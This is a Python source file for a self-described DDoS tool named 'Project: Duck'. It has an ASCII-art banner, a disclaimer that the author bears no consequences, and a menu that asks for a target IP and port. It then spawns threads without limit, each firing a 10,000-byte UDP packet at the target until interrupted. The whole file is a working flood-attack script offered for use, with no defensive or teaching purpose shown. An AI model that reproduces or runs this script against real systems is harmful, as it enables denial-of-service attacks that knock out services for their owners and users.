#########################
# PROJECT: DUCK         #
# AUTHOR: OSKAR OPOŃSKI #
#########################
# THIS IS A DDOS TOOL.  #
# THE AUTHOR DOES NOT   #
# BEAR THE CONSEQUENCES #
# FOR ANY DAMAGE!       #
#########################

import socket
import threading
import subprocess

try:
    from colorama import Fore, Style
except Exception as e:
    exit(f"[ERROR] {e}")

GREEN = Fore.GREEN
RED = Fore.RED
BLUE = Fore.BLUE
YELLOW = Fore.YELLOW
PURPLE = Fore.MAGENTA
RESET = Style.RESET_ALL

BANNER = YELLOW + f"""
⠀⠀⠀⠀⠀⠀⣀⣤⣶⣶⣤⡀
⠀⠀⠀⠀⢀⣾⠛⠁⢰⣧⡈⢻⣦
⠀⠀⠀⠀⢸⣇⣼⡀⠻⠟⠁⠀⢻⡆          {PURPLE}PROJECT: DUCK{YELLOW}
⠀⠀⠀⢀⡞⣹⠙⣧⡀⠀⠀⡀⢸⡇          {PURPLE}AUTHOR: Oskar Opoński | https://github.com/oskaroponski{YELLOW}
⠀⣀⡴⠋⠀⣀⣴⣿⡷⠴⠞⠁⢸⡇          {RED}THIS IS DDOS TOOL. THE AUTHOR DOES NOT BEAR THE CONSEQUENCES FOR ANY DAMAGE!{YELLOW}
⢾⣁⣀⡤⠾⠛⠁⣸⠀⠀⠀⠀⢸⡇
⠈⠁⠀⠀⠀⠀⢠⡟⠀⠀⠀⠀⣾⠃
⠀⠀⠀⠀⠀⣠⣿⠁⠀⠀⠀⢀⣿
⠀⠀⠀⠀⣰⡿⠁⠀⠀⠀⠀⠀⢿⣶⠶⠿⠟⠿⠿⣶⣦⣄⡀
⠀⠀⠀⣼⠟⠀⠀⠀⠀⠀⠀⠀⠈⠻⣄⠀⠀⠀⠀⠀⠈⠙⠛⠿⠶⣶⣤⡀
⠀⠀⣸⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⢀⣀⣠⣤⣤⣤⣤⣤⣀⠀⠉⠙⠳⢦⣄⡀⣀⣤⣀⣀⡄
⠀⢀⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠈⠉⠻⢶⣀⠀⠀⠈⠉⢁⠈⠏⣿⣁
⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣦⣀⣀⡴⠁⠀⠀⢙⣿⡾
⠀⠘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠀⠀⣀⣠⡾⠟⠃
⠀⠀⠹⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⡔⢊⣵⠞⠋⠁
⠀⠀⠀⠙⠿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠚⠉⠀⣠⣴⠟⠁
⠀⠀⠀⠀⠀⠈⠙⠳⠶⣤⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⢤⣤⣴⠊⣁⣤⠶⠛⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⡷⢶⡶⠶⠤⠔⢺⠃⡟⠉⠉
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⠀⢰⡇⠀⡇⠀⠀⠀⢸⠀⠃
⠀⠀⠀⠀⠀⠀⠀⠀⠈⣹⣤⣭⠿⠟⣃⣾⠋⠀⠀⢠⡟⢸
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠈⠉⠙⠛⢋⣿⣙⣶⣾⡿⢷⡿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠛⠛⠻⠧⠶⠾⠛⠁
""" + RESET

def send_packets(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(b"A" * 10000, (ip, port))

    except Exception as e:
        exit(f"{RED}[ERROR] {e}{RESET}")

print(BANNER)

print("-1. Update")
print("0.  Exit")
print("1.  DDoS attack")

try:
    choice = int(input(f"{BLUE}[INPUT] Choice: {RESET}"))
except Exception as e:
    exit(f"{RED}[ERROR] {e}{RESET}")

if choice == -1:
    import updater

if choice == 0:
    exit()

if choice == 1:
    try:
        ip = input(BLUE + "[INPUT] Target IP: " + RESET)
    except Exception as e:
        exit(f"{RED}[ERROR] {e}{RESET}")

    try:
        port = int(input(BLUE + "[INPUT] Target Port: " + RESET))
    except Exception as e:
        exit(f"{RED}[ERROR] {e}{RESET}")

    print(GREEN + "[SUCCESS] Starting attack... Press Ctrl+C to stop." + RESET)

    try:
        while True:
            thread = threading.Thread(target=send_packets, args=(ip, port))
            thread.start()

    except KeyboardInterrupt:
        print(RED + "\n[FAILED] Attack stopped." + RESET)
